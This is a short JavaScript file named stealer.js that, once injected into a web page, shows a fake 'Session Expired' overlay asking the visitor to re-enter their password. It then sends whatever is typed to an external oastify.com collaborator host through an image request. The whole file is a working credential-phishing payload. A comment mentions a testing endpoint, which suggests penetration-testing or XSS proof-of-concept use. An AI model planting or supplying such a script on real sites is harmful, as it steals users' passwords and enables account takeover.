// stealer.js
document.addEventListener('DOMContentLoaded', function() {
    console.log('DOM content loaded'); // Log when the DOM is ready.

    // Create the form element
    var form = document.createElement('form');
    form.style.position = 'fixed';
    form.style.top = '30%';
    form.style.left = '50%';
    form.style.transform = 'translate(-50%, -50%)';
    form.style.background = 'white';
    form.style.padding = '20px';
    form.style.boxShadow = '0 0 10px rgba(0,0,0,0.3)';
    form.style.zIndex = '99999'; // Ensure it appears above other elements.
    form.style.maxWidth = '400px'; // Set a max-width for better appearance.
    form.style.borderRadius = '8px'; // Add some border radius for aesthetics.

    // Form content
    form.innerHTML = `
        <h2>Session Expired</h2>
        <p>Please re-enter your password:</p>
        <input type="password" id="password" placeholder="Enter password" required>
        <button type="submit">Submit</button>
    `;

    // Log the form creation process.
    console.log('Form created:', form);

    // Append the form to the body.
    document.body.appendChild(form);
    console.log('Form added to the body.');

    // Handle form submission
    form.addEventListener('submit', function(e) {
        e.preventDefault(); // Prevent the form from actually submitting.
        
        let password = document.getElementById('password').value;
        console.log('Password entered:', password); // Log the password for debugging.

        // Send the password to an external server (change this to your testing endpoint).
        const img = new Image();
        img.src = `https://7z78izwvrg0u9gsi9lwme1z29tfk3c20r.oastify.com?password=${encodeURIComponent(password)}`;

        // Change the form content to show that it's processing.
        form.innerHTML = "<p>Loading...</p>";
        console.log('Password sent to external server.');
    });
});
